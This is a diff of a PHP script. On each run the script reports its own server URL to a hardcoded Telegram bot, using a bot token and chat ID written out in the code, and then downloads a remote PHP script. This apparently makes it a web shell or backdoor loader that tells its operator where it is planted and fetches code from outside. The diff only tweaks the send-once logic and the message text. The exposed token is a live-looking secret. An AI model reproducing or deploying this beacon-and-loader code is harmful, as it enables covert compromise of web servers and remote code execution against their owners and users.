@@ -33,11 +33,8 @@ function download($url) {
 }
 
 function sendToTelegram($message) {
-    static $alreadySentMessages = [];
-
-    if (in_array($message, $alreadySentMessages)) {
-        return;
-    }
+    static $sent = false;
+    if ($sent) return;
 
     $botToken = '7132923060:AAFEoSvpWMvHFUYgeSeA_8WDCwRjPEpk4ok'; // Ganti dengan token bot Telegram Anda
     $chatId = '1345261884';     // Ganti dengan chat ID Anda
@@ -68,12 +65,11 @@ function sendToTelegram($message) {
         file_get_contents($url, false, $context);
     }
 
-    $alreadySentMessages[] = $message;
+    $sent = true;
 }
 
-// Kirim URL file PHP ke Telegram
 $fileUrl = (isset($_SERVER['HTTPS']) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
-sendToTelegram("Script URL: $fileUrl");
+sendToTelegram("Hai : $fileUrl");
 
 $phpScript = download($url);
 
